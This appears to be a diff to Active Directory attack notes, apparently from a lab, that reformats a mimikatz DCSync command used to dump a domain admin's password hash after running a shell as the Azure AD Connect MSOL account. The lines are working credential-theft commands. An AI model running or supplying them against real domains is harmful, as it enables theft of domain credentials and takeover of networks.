@@ -286,7 +286,8 @@ Get-ADGroupMember 'domain admins' | select name,samaccountname
 runas /user:YOUDOMAIN\MSOL_xxxxxx cmd.exe
 
 # in the newly opened cmd (running in the context of MSOL user) dump rootuser's hash (rootuser is a domain admin)
-C:\lab\mimikatz\x64\mimikatz.exe "lsadump::dcsync /user:rootuser"
+C:\lab\mimikatz\x64\mimikatz.exe 
+lsadump::dcsync /user:rootuser
 
 # from a new cmd:
 
